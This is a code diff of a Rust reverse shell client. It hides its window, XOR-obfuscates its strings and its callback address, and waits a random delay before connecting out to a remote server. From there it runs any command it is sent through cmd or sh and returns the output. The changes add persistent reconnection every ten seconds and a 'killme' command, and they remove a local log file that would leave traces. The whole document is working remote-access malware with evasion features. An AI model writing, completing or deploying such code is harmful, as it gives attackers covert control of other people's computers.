@@ -1,16 +1,22 @@
 #![windows_subsystem = "windows"]
+use dirs;
+use rand::Rng;
+use std::env;
 use std::io::{Read, Write};
 use std::net::TcpStream;
-use std::process::{Command, Stdio};
-use std::env;
-use std::path::PathBuf;
-use std::fs::OpenOptions;
-use std::thread;
-use std::time::Duration;
-use rand::Rng;
-use dirs;
 #[cfg(windows)]
 use std::os::windows::process::CommandExt;
+use std::path::PathBuf;
+use std::process::{Command, Stdio};
+use std::thread;
+use std::time::Duration;
+
+// Custom result to indicate whether to continue or terminate
+#[derive(PartialEq)]
+enum ConnectionResult {
+    Continue,  // Connection closed, retry
+    Terminate, // Killme received, exit program
+}
 
 fn xor_obfuscate(s: &str, key: u8) -> Vec<u8> {
     s.bytes().map(|b| b ^ key).collect()
@@ -20,7 +26,7 @@ fn xor_deobfuscate(data: &[u8], key: u8) -> String {
     String::from_utf8(data.iter().map(|&b| b ^ key).collect()).unwrap_or_default()
 }
 
-fn process_connection(mut stream: TcpStream) -> std::io::Result<()> {
+fn process_connection(mut stream: TcpStream) -> std::io::Result<ConnectionResult> {
     // Send initial "ready" message to synchronize
     let ready_msg = b"Client ready\n";
     let len = ready_msg.len() as u32;
@@ -32,28 +38,38 @@ fn process_connection(mut stream: TcpStream) -> std::io::Result<()> {
     let exit_cmd = xor_obfuscate("exit", 0x42);
     let shell_win = xor_obfuscate("cmd", 0x42);
     let shell_unix = xor_obfuscate("sh", 0x42);
-    let cls_cmd = xor_obfuscate("cls", 0x42);
-    let clear_cmd = xor_obfuscate("clear", 0x42);
-    
+
     loop {
         // Clear buffer before reading
         data_buffer.fill(0);
         // Read command from server
         let bytes_read = stream.read(&mut data_buffer)?;
         if bytes_read == 0 {
-            return Ok(());
+            return Ok(ConnectionResult::Continue); // Connection closed by server
         }
 
-        let input = String::from_utf8_lossy(&data_buffer[..bytes_read]).trim().to_string();
-        
-        // Exit condition
+        let input = String::from_utf8_lossy(&data_buffer[..bytes_read])
+            .trim()
+            .to_string();
+
+        // Exit command: close connection but keep client running
         if input.as_bytes() == xor_obfuscate(&xor_deobfuscate(&exit_cmd, 0x42), 0x42) {
             let response = b"Goodbye\n";
             let len = response.len() as u32;
             stream.write_all(&len.to_be_bytes())?;
             stream.write_all(response)?;
             stream.flush()?;
-            return Ok(());
+            return Ok(ConnectionResult::Continue);
+        }
+
+        // Killme command: terminate client
+        if input == "killme" {
+            let response = b"Terminating client\n";
+            let len = response.len() as u32;
+            stream.write_all(&len.to_be_bytes())?;
+            stream.write_all(response)?;
+            stream.flush()?;
+            return Ok(ConnectionResult::Terminate);
         }
 
         // Skip empty input
@@ -103,26 +119,15 @@ fn process_connection(mut stream: TcpStream) -> std::io::Result<()> {
             stream.flush()?;
             continue;
         }
-
-        // Handle cls and clear commands
-        if (cfg!(target_os = "windows") && cmd_name.as_bytes() == xor_obfuscate(&xor_deobfuscate(&cls_cmd, 0x42), 0x42)) || 
-           (cfg!(not(target_os = "windows")) && cmd_name.as_bytes() == xor_obfuscate(&xor_deobfuscate(&clear_cmd, 0x42), 0x42)) {
-            let response = b"Screen clear command executed\n";
-            let len = response.len() as u32;
-            stream.write_all(&len.to_be_bytes())?;
-            stream.write_all(response)?;
-            stream.flush()?;
-            continue;
-        }
-
+        // Execute other commands
         let output = if cfg!(target_os = "windows") {
             let mut cmd = Command::new(xor_deobfuscate(&shell_win, 0x42));
             cmd.args(&["/C", cmd_name])
-               .args(args)
-               .current_dir(current_dir)
-               .stdout(Stdio::piped())
-               .stderr(Stdio::piped())
-               .creation_flags(0x08000000);
+                .raw_arg(format!("{}", args.join(" ")))
+                .current_dir(current_dir)
+                .stdout(Stdio::piped())
+                .stderr(Stdio::piped())
+                .creation_flags(0x08000000);
             cmd.output()
         } else {
             Command::new(xor_deobfuscate(&shell_unix, 0x42))
@@ -157,20 +162,26 @@ fn main() -> std::io::Result<()> {
     let delay = rand::thread_rng().gen_range(1000..5000);
     thread::sleep(Duration::from_millis(delay));
 
-    if let Ok(mut file) = OpenOptions::new()
-        .create(true)
-        .append(true)
-        .open("app_log.txt") {
-        let _ = writeln!(file, "Application started at {:?}", std::time::SystemTime::now());
-    }
-
     let remote_addr_obf = xor_obfuscate("10.5.22.214:7878", 0x42);
     let remote_addr = xor_deobfuscate(&remote_addr_obf, 0x42);
-    
-    let mut stream = TcpStream::connect(&remote_addr)?;
-    stream.flush()?;
-    
-    process_connection(stream)?;
 
-    Ok(())
+    loop {
+        match TcpStream::connect(&remote_addr) {
+            Ok(mut stream) => {
+                stream.flush()?;
+                match process_connection(stream) {
+                    Ok(ConnectionResult::Terminate) => {
+                        return Ok(());
+                    }
+                    Ok(ConnectionResult::Continue) => {}
+                    Err(_) => {}
+                }
+                // Sleep before retrying
+                thread::sleep(Duration::from_secs(10));
+            }
+            Err(_) => {
+                thread::sleep(Duration::from_secs(10));
+            }
+        }
+    }
 }
